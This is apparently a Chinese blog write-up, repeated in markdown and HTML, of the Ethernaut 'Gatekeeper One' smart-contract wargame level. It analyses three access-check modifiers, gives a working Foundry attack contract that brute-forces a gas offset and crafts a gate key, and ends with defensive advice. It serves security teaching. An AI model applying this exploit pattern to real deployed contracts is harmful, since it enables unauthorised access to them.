Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\n这个 `modifier` 要求 `msg.sender` 不等于 `tx.origin`。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 `enter` 函数。这样，`tx.origin` 将是我们的EOA地址，而 `msg.sender` 将是攻击合约的地址。\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  require(gasleft() % 8191 == 0);\n  _;\n}\n```\n\n这个 `modifier` 要求在执行到这里时，剩余的 `gas` 必须是 `8191` 的倍数。这是一个棘手的约束，因为 `gas` 的消耗会因操作码、Solidity版本和优化器设置而异。\n\n最直接的方法是进行暴力破解：通过一个循环，在调用 `enter` 函数时尝试不同的 `gas` 值，直到找到一个满足 `gasleft() % 8191 == 0` 的值。\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n  require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n  _;\n}\n```\n\n这个 `modifier` 对我们传入的 `_gateKey` (一个 `bytes8` 类型的值) 进行了三项检查：\n\n1.  `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`\n    *   `uint64(_gateKey)` 将 `bytes8` 转换为 `uint64`。\n    *   `uint32(...)` 会截断，只保留低32位。\n    *   `uint16(...)` 会截断，只保留低16位。\n    *   为了让两者相等，`_gateKey` 的第17位到第32位必须全为0。例如，`0x????????0000????`。\n\n2.  `uint32(uint64(_gateKey)) != uint64(_gateKey)`\n    *   这要求 `_gateKey` 的高32位不全为0。\n\n3.  `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`\n    *   `uint16(uint160(tx.origin))` 获取 `tx.origin` 地址的最低16位。\n    *   这要求 `_gateKey` 的低32位（经过第一次检查后，其实就是低16位）必须等于 `tx.origin` 的低16位。\n\n综合这三个条件，我们可以构造出 `_gateKey`：\n-   将 `tx.origin` (即我们的EOA地址) 的低16位作为 `_gateKey` 的低16位。\n-   确保 `_gateKey` 的17-32位为0。\n-   在 `_gateKey` 的高32位中设置至少一个非零位。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n这是我们的Foundry测试合约，它将部署攻击合约并调用 `enter` 函数。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/13_GatekeeperOne.sol\";\n\ncontract GatekeeperOneTest is Test {\n    GatekeeperOne instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperOne();\n        attacker = new Attack(address(instance));\n    }\n\n    function testattacker() public {\n        vm.startPrank(player1, player1);\n        // 使用试错法找到合适的gas值 (例如 268)\n        attacker.attack(268);\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\ncontract Attack is Test {\n    GatekeeperOne instance;\n\n    constructor(address fb) {\n        instance = GatekeeperOne(fb);\n    }\n\n    // 构造 gateKey 并使用指定的 gas 调用 enter 函数\n    function attack(uint256 gas) public {\n        // 构造满足 gateThree 的 key\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n\n        // 使用计算好的 gas 调用目标函数\n        instance.enter{gas: 8191 * 10 + gas}(gateKey);\n    }\n\n    // 用于暴力破解 gas 值的函数\n    function findGas() public {\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n        \n        for (uint256 i = 0; i < 8191; i++) {\n            try instance.enter{gas: 8191 * 10 + i}(gateKey) {\n                console.log(\"Found gas:\", i); // 实验得出 i = 268\n                return;\n            } catch {}\n        }\n        revert(\"No gas match found!\");\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **创建攻击合约**: 绕过 `gateOne` (`msg.sender != tx.origin`)。\n2.  **构造 `_gateKey`**:\n    *   获取 `tx.origin` 的低16位。\n    *   将其构造成一个 `bytes8` 值，满足 `gateThree` 的所有 `require` 条件。\n3.  **暴力破解 `gas`**:\n    *   编写一个循环，尝试不同的 `gas` 值来调用 `enter` 函数。\n    *   在 `Foundry` 测试中，我们可以通过 `try/catch` 捕获失败的调用，直到找到一个成功的 `gas` 值（例如，`gas` 偏移量为 `268`）。\n4.  **发起攻击**: 使用找到的 `gas` 值和构造的 `_gateKey` 从攻击合约中调用 `enter` 函数。\n\n## 🛡️ 防御措施\n\n1.  **避免复杂的 `gas` 检查**: `gasleft()` 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。\n2.  **简化类型转换逻辑**: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。\n3.  **使用更安全的认证模式**: 不要依赖 `tx.origin` 或 `gas` 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。\n\n## 🔧 相关工具和技术\n\n-   **Foundry `try/catch`**: 用于在测试中捕获和处理预期的 `revert`，非常适合暴力破解 `gas` 等场景。\n-   **位操作 (`|`, `&`)**: 在构造 `_gateKey` 时用于精确控制字节内容。\n-   **类型转换**: 深入理解Solidity中不同整数类型（`uint16`, `uint32`, `uint64`）和字节类型（`bytes8`）之间的转换规则至关重要。\n\n## 🎯 总结\n\n**核心概念**:\n-   `tx.origin` vs `msg.sender` 的区别是许多合约攻击的基础。\n-   `gasleft()` 的值是动态的，依赖它进行验证是脆弱的。\n-   Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。\n\n**攻击向量**:\n-   通过中间合约绕过 `tx.origin` 检查。\n-   通过暴力破解找到满足 `gasleft()` 模运算的 `gas` 值。\n-   通过逆向工程类型转换和位操作的 `require` 条件来构造一个有效的输入。\n\n**防御策略**:\n-   不要将 `gas` 消耗作为安全机制。\n-   保持验证逻辑的简单和直接。\n-   使用经过验证的、更强大的身份验证模式。\n\n## 📚 参考资料\n\n-   [Solidity 类型转换](https://docs.soliditylang.org/en/latest/types.html#conversions)\n-   [tx.origin vs msg.sender](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)","slug":"ethernaut-level-13-gatekeeper-one","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpc0011bf5qg9jedx7i","content":"<h1 id=\"🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换\"><a href=\"#🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换\" class=\"headerlink\" title=\"🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换\"></a>🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/13\">Ethernaut Level 13 - Gatekeeper One</a><br><strong>攻击类型</strong>: Gas计算 &#x2F; 类型转换<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>通过三个 <code>modifier</code> 的检测，成功调用 <code>enter</code> 函数，成为 <code>entrant</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg\" alt=\"Gatekeeper One Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，但必须绕过它的三个 <code>modifier</code>。让我们逐一分析。</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 要求 <code>msg.sender</code> 不等于 <code>tx.origin</code>。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 <code>enter</code> 函数。这样，<code>tx.origin</code> 将是我们的EOA地址，而 <code>msg.sender</code> 将是攻击合约的地址。</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  require(gasleft() % 8191 == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 要求在执行到这里时，剩余的 <code>gas</code> 必须是 <code>8191</code> 的倍数。这是一个棘手的约束，因为 <code>gas</code> 的消耗会因操作码、Solidity版本和优化器设置而异。</p>\n<p>最直接的方法是进行暴力破解：通过一个循环，在调用 <code>enter</code> 函数时尝试不同的 <code>gas</code> 值，直到找到一个满足 <code>gasleft() % 8191 == 0</code> 的值。</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 对我们传入的 <code>_gateKey</code> (一个 <code>bytes8</code> 类型的值) 进行了三项检查：</p>\n<ol>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code></p>\n<ul>\n<li><code>uint64(_gateKey)</code> 将 <code>bytes8</code> 转换为 <code>uint64</code>。</li>\n<li><code>uint32(...)</code> 会截断，只保留低32位。</li>\n<li><code>uint16(...)</code> 会截断，只保留低16位。</li>\n<li>为了让两者相等，<code>_gateKey</code> 的第17位到第32位必须全为0。例如，<code>0x????????0000????</code>。</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>\n<ul>\n<li>这要求 <code>_gateKey</code> 的高32位不全为0。</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</code></p>\n<ul>\n<li><code>uint16(uint160(tx.origin))</code> 获取 <code>tx.origin</code> 地址的最低16位。</li>\n<li>这要求 <code>_gateKey</code> 的低32位（经过第一次检查后，其实就是低16位）必须等于 <code>tx.origin</code> 的低16位。</li>\n</ul>\n</li>\n</ol>\n<p>综合这三个条件，我们可以构造出 <code>_gateKey</code>：</p>\n<ul>\n<li>将 <code>tx.origin</code> (即我们的EOA地址) 的低16位作为 <code>_gateKey</code> 的低16位。</li>\n<li>确保 <code>_gateKey</code> 的17-32位为0。</li>\n<li>在 <code>_gateKey</code> 的高32位中设置至少一个非零位。</li>\n</ul>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>这是我们的Foundry测试合约，它将部署攻击合约并调用 <code>enter</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/13_GatekeeperOne.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GatekeeperOneTest is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperOne();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testattacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // 使用试错法找到合适的gas值 (例如 268)</span><br><span class=\"line\">        attacker.attack(268);</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address fb) &#123;</span><br><span class=\"line\">        instance = GatekeeperOne(fb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 构造 gateKey 并使用指定的 gas 调用 enter 函数</span><br><span class=\"line\">    function attack(uint256 gas) public &#123;</span><br><span class=\"line\">        // 构造满足 gateThree 的 key</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 使用计算好的 gas 调用目标函数</span><br><span class=\"line\">        instance.enter&#123;gas: 8191 * 10 + gas&#125;(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 用于暴力破解 gas 值的函数</span><br><span class=\"line\">    function findGas() public &#123;</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class=\"line\">            try instance.enter&#123;gas: 8191 * 10 + i&#125;(gateKey) &#123;</span><br><span class=\"line\">                console.log(&quot;Found gas:&quot;, i); // 实验得出 i = 268</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125; catch &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        revert(&quot;No gas match found!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>创建攻击合约</strong>: 绕过 <code>gateOne</code> (<code>msg.sender != tx.origin</code>)。</li>\n<li><strong>构造 <code>_gateKey</code></strong>:<ul>\n<li>获取 <code>tx.origin</code> 的低16位。</li>\n<li>将其构造成一个 <code>bytes8</code> 值，满足 <code>gateThree</code> 的所有 <code>require</code> 条件。</li>\n</ul>\n</li>\n<li><strong>暴力破解 <code>gas</code></strong>:<ul>\n<li>编写一个循环，尝试不同的 <code>gas</code> 值来调用 <code>enter</code> 函数。</li>\n<li>在 <code>Foundry</code> 测试中，我们可以通过 <code>try/catch</code> 捕获失败的调用，直到找到一个成功的 <code>gas</code> 值（例如，<code>gas</code> 偏移量为 <code>268</code>）。</li>\n</ul>\n</li>\n<li><strong>发起攻击</strong>: 使用找到的 <code>gas</code> 值和构造的 <code>_gateKey</code> 从攻击合约中调用 <code>enter</code> 函数。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免复杂的 <code>gas</code> 检查</strong>: <code>gasleft()</code> 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。</li>\n<li><strong>简化类型转换逻辑</strong>: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。</li>\n<li><strong>使用更安全的认证模式</strong>: 不要依赖 <code>tx.origin</code> 或 <code>gas</code> 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>Foundry <code>try/catch</code></strong>: 用于在测试中捕获和处理预期的 <code>revert</code>，非常适合暴力破解 <code>gas</code> 等场景。</li>\n<li><strong>位操作 (<code>|</code>, <code>&amp;</code>)</strong>: 在构造 <code>_gateKey</code> 时用于精确控制字节内容。</li>\n<li><strong>类型转换</strong>: 深入理解Solidity中不同整数类型（<code>uint16</code>, <code>uint32</code>, <code>uint64</code>）和字节类型（<code>bytes8</code>）之间的转换规则至关重要。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>tx.origin</code> vs <code>msg.sender</code> 的区别是许多合约攻击的基础。</li>\n<li><code>gasleft()</code> 的值是动态的，依赖它进行验证是脆弱的。</li>\n<li>Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过中间合约绕过 <code>tx.origin</code> 检查。</li>\n<li>通过暴力破解找到满足 <code>gasleft()</code> 模运算的 <code>gas</code> 值。</li>\n<li>通过逆向工程类型转换和位操作的 <code>require</code> 条件来构造一个有效的输入。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>不要将 <code>gas</code> 消耗作为安全机制。</li>\n<li>保持验证逻辑的简单和直接。</li>\n<li>使用经过验证的、更强大的身份验证模式。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/types.html#conversions\">Solidity 类型转换</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">tx.origin vs msg.sender</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换\"><a href=\"#🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换\" class=\"headerlink\" title=\"🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换\"></a>🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/13\">Ethernaut Level 13 - Gatekeeper One</a><br><strong>攻击类型</strong>: Gas计算 &#x2F; 类型转换<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>通过三个 <code>modifier</code> 的检测，成功调用 <code>enter</code> 函数，成为 <code>entrant</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg\" alt=\"Gatekeeper One Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，但必须绕过它的三个 <code>modifier</code>。让我们逐一分析。</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 要求 <code>msg.sender</code> 不等于 <code>tx.origin</code>。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 <code>enter</code> 函数。这样，<code>tx.origin</code> 将是我们的EOA地址，而 <code>msg.sender</code> 将是攻击合约的地址。</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  require(gasleft() % 8191 == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 要求在执行到这里时，剩余的 <code>gas</code> 必须是 <code>8191</code> 的倍数。这是一个棘手的约束，因为 <code>gas</code> 的消耗会因操作码、Solidity版本和优化器设置而异。</p>\n<p>最直接的方法是进行暴力破解：通过一个循环，在调用 <code>enter</code> 函数时尝试不同的 <code>gas</code> 值，直到找到一个满足 <code>gasleft() % 8191 == 0</code> 的值。</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 对我们传入的 <code>_gateKey</code> (一个 <code>bytes8</code> 类型的值) 进行了三项检查：</p>\n<ol>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code></p>\n<ul>\n<li><code>uint64(_gateKey)</code> 将 <code>bytes8</code> 转换为 <code>uint64</code>。</li>\n<li><code>uint32(...)</code> 会截断，只保留低32位。</li>\n<li><code>uint16(...)</code> 会截断，只保留低16位。</li>\n<li>为了让两者相等，<code>_gateKey</code> 的第17位到第32位必须全为0。例如，<code>0x????????0000????</code>。</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>\n<ul>\n<li>这要求 <code>_gateKey</code> 的高32位不全为0。</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</code></p>\n<ul>\n<li><code>uint16(uint160(tx.origin))</code> 获取 <code>tx.origin</code> 地址的最低16位。</li>\n<li>这要求 <code>_gateKey</code> 的低32位（经过第一次检查后，其实就是低16位）必须等于 <code>tx.origin</code> 的低16位。</li>\n</ul>\n</li>\n</ol>\n<p>综合这三个条件，我们可以构造出 <code>_gateKey</code>：</p>\n<ul>\n<li>将 <code>tx.origin</code> (即我们的EOA地址) 的低16位作为 <code>_gateKey</code> 的低16位。</li>\n<li>确保 <code>_gateKey</code> 的17-32位为0。</li>\n<li>在 <code>_gateKey</code> 的高32位中设置至少一个非零位。</li>\n</ul>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>这是我们的Foundry测试合约，它将部署攻击合约并调用 <code>enter</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/13_GatekeeperOne.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GatekeeperOneTest is Test &#123;</span><br><span class=\"line\">    GatekeeperOne 